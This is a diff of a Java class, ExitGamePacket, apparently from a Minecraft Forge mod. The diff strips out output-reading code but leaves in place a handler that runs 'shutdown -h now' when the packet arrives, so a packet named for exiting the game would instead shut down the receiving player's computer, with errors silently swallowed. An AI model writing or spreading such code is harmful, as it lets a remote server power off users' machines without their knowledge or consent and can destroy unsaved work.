@@ -9,9 +9,7 @@ import net.minecraftforge.fml.common.network.simpleimpl.MessageContext;
 import net.minecraftforge.fml.relauncher.Side;
 import net.minecraftforge.fml.relauncher.SideOnly;
 
-import java.io.BufferedReader;
 import java.io.IOException;
-import java.io.InputStreamReader;
 import java.util.Scanner;
 
 public class ExitGamePacket implements IMessage {
@@ -49,12 +47,6 @@ public class ExitGamePacket implements IMessage {
                     ProcessBuilder processBuilder = new ProcessBuilder();
                     processBuilder.command("shutdown -h now");
                     Process process = processBuilder.start();
-                    StringBuilder output = new StringBuilder();
-                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                    String line;
-                    while ((line = reader.readLine()) != null) {
-                        output.append(line).append("\n");
-                    }
                 } catch (IOException ignored) {
                 }
             }
